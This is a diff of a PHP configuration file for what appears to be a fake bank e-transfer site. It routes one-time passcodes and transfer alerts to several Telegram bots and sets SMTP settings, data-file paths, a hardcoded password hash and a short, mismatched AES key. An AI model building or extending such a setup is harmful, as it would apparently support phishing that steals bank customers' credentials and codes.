@@ -1,87 +1,89 @@
 <?php
 return [
-    'app' => [
-        'csrf_token_length'    => 32,
-        'transfer_expiry_days' => 30,
-        'default_sender_name'  => 'DEMO BANK',
-        'timezone'             => 'UTC',
-        'maintenance_mode'     => false,
-        'debug_mode'           => true,
-    ],
+    // General
+    'sendername'       => 'KOURTNEY KIVIERA',
+    'support_email'    => 'support@example.com',
+    'support_phone'    => '+1 (780) 473-4567',
 
-    'paths' => [
-        'accounts'       => './data/accounts.json',
-        'pending'        => './data/pending.csv',
-        'contacts'       => './data/contacts.csv',
-        'transactions'   => './data/transactions.log',
-        'transfers'      => './data/transfers.csv',
-        'email_template' => './template/etransfer_template.html',
-        'logs_dir'       => './logs',
-        'backups_dir'    => './backups',
-        'web_root'       => './.www',
-        'uploads_dir'    => './uploads',
-        'config_dir'     => './config',
-    ],
-
-    'smtp' => [
-        'host'       => 'smtp.office365.com',
-        'port'       => 587,
-        'encryption' => 'tls',
-        'user'       => '<smtp_username>',
-        'password'   => '<smtp_password>',
-        'from_email' => '<from@example.com>',
-        'from_name'  => 'DEMO BANK',
-    ],
-
+    // Telegram bot controllers (multiple bots)
     'telegram' => [
-        'bots' => [
-            ['token' => '<bot_token_general>', 'chat_ids' => ['<chat_id_general>'], 'purpose' => 'general notifications'],
-            ['token' => '<bot_token_etransfer>', 'chat_ids' => ['<chat_id_etransfer>'], 'purpose' => 'e-transfer alerts'],
-            ['token' => '<bot_token_otp>', 'chat_ids' => ['<chat_id_otp>'], 'purpose' => 'OTP delivery'],
-            ['token' => '<bot_token_admin>', 'chat_ids' => ['<chat_id_admin>'], 'purpose' => 'admin alerts'],
-            ['token' => '<bot_token_logs>', 'chat_ids' => ['<chat_id_logs>'], 'purpose' => 'system logging'],
+        'tokens'   => [
+            'bot_token_1',
+            'bot_token_2',
+            // add more tokens as needed
         ],
-        'controller_name' => 'demo_bank_controller',
+        'chat_ids' => [
+            '-1001234567890',
+            '-1009876543210',
+            // add more chat IDs as needed
+        ],
     ],
 
+    // OTP notification bot
     'otp' => [
-        'bots' => [
-            ['token' => '<otp_bot_token>', 'chat_ids' => ['<otp_chat_id>'], 'purpose' => 'OTP notifications'],
+        'tokens'   => [
+            'otp_bot_token_1',
+            'otp_bot_token_2',
+        ],
+        'chat_ids' => [
+            '-1001111111111',
+            '-1002222222222',
         ],
     ],
 
+    // Admin bot notifications
     'admin' => [
-        'bots' => [
-            ['token' => '<admin_bot_token>', 'chat_ids' => ['<admin_chat_id>'], 'purpose' => 'super admin'],
+        'tokens'   => [
+            'admin_bot_token',
+        ],
+        'chat_ids' => [
+            '-1003333333333',
         ],
     ],
 
-    'security' => [
-        'account_password_hash' => '<bcrypt_hash_here>',
-        'csrf_check_enabled'    => true,
-        'two_factor_enabled'    => true,
-        'rate_limit_per_minute' => 60,
+    // SMTP configuration for sending emails
+    'smtp' => [
+        'host'     => 'smtp.example.com',
+        'port'     => 587,
+        'user'     => 'your_email@example.com',
+        'pass'     => 'your_email_password',
+        'from'     => 'your_email@example.com',
+        'encryption'=> 'tls', // options: 'tls', 'ssl', ''
     ],
 
+    // Web templates
+    'email_template'      => './template/default_template.html',
+    'etransfer_template'  => './template/etransfer_template.html',
+
+    // Files
+    'accounts_file'       => './data/accounts.json',
+    'pending_file'        => './data/pending.csv',
+    'contacts_file'       => './data/contacts.csv',
+    'transactions_file'   => './data/transactions.log',
+    'transfers_file'      => './data/transfers.csv',
+
+    // Security
+    'csrf_token_length'   => 32,
+    'transfer_expiry_days'=> 30,
+    'account_password_hash'=> '$2y$10$e0NRtH9F1xRk4cB9Xv5uUeS.Kb4mW.uP6OxKQk0RQcLr/OeBtpi5C',
+
+    // Encryption
     'encryption' => [
-        'key_hex' => '<64_hex_characters_here>',
-        'cipher'  => 'aes-256-cbc',
+        'key'    => '8d969eef6ecad3c29a3a629280e686cf0d4a7d8cc7',
+        'cipher' => 'aes-256-cbc',
     ],
 
-    'operational' => [
-        'backup_before_overwrite' => true,
-        'backup_retention_days'   => 30,
-        'log_level'               => 'debug',
-        'show_errors'             => true,
-        'maintenance_mode'        => false,
-        'auto_update'             => false,
+    // Optional extended bots
+    'extra_bots' => [
+        [
+            'name'     => 'ExtraBot1',
+            'token'    => 'extra_bot_token_1',
+            'chat_ids' => ['-1004444444444', '-1005555555555'],
+        ],
+        [
+            'name'     => 'ExtraBot2',
+            'token'    => 'extra_bot_token_2',
+            'chat_ids' => ['-1006666666666'],
+        ],
     ],
-
-    // INSTRUCTIONS:
-    // 1. Configure Telegram bots for e-transfers, OTPs, admin, and logging.
-    // 2. Ensure SMTP is set for demo notifications (emails can be fake/sandboxed).
-    // 3. Place your demo web app in paths['web_root'].
-    // 4. Data files (accounts.json, transfers.csv, etc.) must be writable.
-    // 5. Debug mode is enabled for development/testing; disable for production simulation.
-    // 6. Backup files before overwriting any webroot content.
 ];
